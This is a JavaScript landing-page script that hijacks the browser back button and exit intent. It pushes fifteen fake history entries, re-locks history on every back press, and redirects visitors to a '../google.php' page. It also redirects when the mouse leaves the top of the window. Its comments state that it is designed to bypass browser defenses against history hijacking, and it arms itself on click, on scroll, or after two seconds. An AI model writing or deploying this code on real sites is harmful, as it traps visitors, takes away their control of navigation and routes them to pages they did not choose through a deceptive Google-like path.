/**
 * Backfix & Exit-Intent Redirect Script (Ravelizio Version)
 * 
 * Place this script right before </body> on the landing page.
 * It intercepts the back button and exit intent, using three triggers
 * to bypass modern browser history hijacking defenses.
 */
(function() {
    var templateLang = '{{LANG}}';
    var langCode = templateLang;
    
    // If {{LANG}} wasn't replaced by generator, fallback to URL inspection
    if (templateLang === '{{' + 'LANG}}') {
        var pathParts = window.location.pathname.split('/');
        var inSubdir = pathParts.length > 2 && pathParts[pathParts.length - 2].length === 2;
        langCode = inSubdir ? pathParts[pathParts.length - 2] : 'en';
    }

    // Build target search parameters
    var searchParams = new URLSearchParams(window.location.search);
    searchParams.set('lang', langCode);

    // Determine path to central google.php - only redirect if we came from a subdir
    var currentPath = window.location.pathname;
    var pathParts = currentPath.split('/');
    var inSubdir = pathParts.length > 2 && pathParts[pathParts.length - 2].length === 2;
    
    // Only set redirect if in a newsnik subdirectory
    var targetUrl = null;
    if (inSubdir) {
        targetUrl = "../google.php?" + searchParams.toString();
    }
    
    var activated = false;

    // Activation logic: pushes history states and binds popstate listener
    function activateBackBlock() {
        if (activated) return;
        activated = true;

        // Only activate back button interception if we have a valid target URL
        if (!targetUrl) return;

        // Push 15 states to capture back button
        for (var i = 0; i < 15; i++) {
            history.pushState(null, document.title, location.href);
        }

        // Redirect on popstate (back button clicked)
        window.addEventListener('popstate', function() {
            // Push state again to re-lock history
            history.pushState(null, document.title, location.href);
            setTimeout(function() {
                location.replace(targetUrl);
            }, 0);
        });
    }

    // Activate on user interaction
    try {
        activateBackBlock();
    } catch(e) {}

    // --- Activation Triggers (Ravelizio Pattern) ---
    // 1. User clicks anywhere
    document.addEventListener('click', activateBackBlock, { once: true });
    
    // 2. User scrolls down > 10px
    window.addEventListener('scroll', function() {
        if (window.scrollY > 10) {
            activateBackBlock();
        }
    }, { once: true });

    // 3. Timeout: trigger after 2 seconds anyway
    setTimeout(activateBackBlock, 2000);

    // Exit-Intent: redirect when mouse leaves viewport upwards (clientY < 20)
    if (targetUrl) {
        document.addEventListener('mouseleave', function(e) {
            if (e.clientY < 20) {
                location.replace(targetUrl);
            }
        });
    }
})();
